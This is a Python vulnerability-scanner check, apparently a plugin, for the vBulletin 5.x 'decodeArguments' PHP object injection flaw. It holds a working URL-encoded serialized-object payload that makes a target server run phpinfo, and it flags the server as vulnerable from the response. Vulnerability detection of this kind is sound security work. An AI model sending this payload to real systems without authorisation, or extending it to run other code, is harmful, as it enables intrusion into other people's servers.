def run(req, target, info_cb, found_cb, not_found_cb):
    # TODO add auto exploit
    # https://github.com/OWASP/vbscan/blob/master/exploit/decodearguments.pl
    name = "Vbulletin 5.x - Decode arguments exploit"

    uri = f"{target}ajax/api/hook/decodeArguments?arguments=O%3A12%3A\"vB_dB_Result\""
    uri += "%3A2%3A%7Bs%3A5%3A\"%00%2A%00db\"%3BO%3A11%3A\"vB_Database\"%3A1%3A%7Bs%3A9%3A\""
    uri += "functions\"%3Ba%3A1%3A%7Bs%3A11%3A\"free_result\"%3Bs%3A7%3A\""
    uri += "phpinfo\"%3B%7D%7Ds%3A12%3A\"%00%2A%00recordset\"%3Bi%3A1%3B%7D"

    is_vulnerable = False

    info_cb(f"Checking {name}")
    r = req.get(uri)

    if r.status_code == 200 and "phpinfo" in str(r.content):
        import os
        exploit = "/usr/share/exploitdb/exploits/php/webapps/38790.pl"
        if not os.path.exists(exploit) or not os.path.isfile(exploit):
            exploit = "https://www.exploit-db.com/exploits/38790/"
        found_cb(name, exploit)
        is_vulnerable = True

    if not is_vulnerable:
        not_found_cb(name)
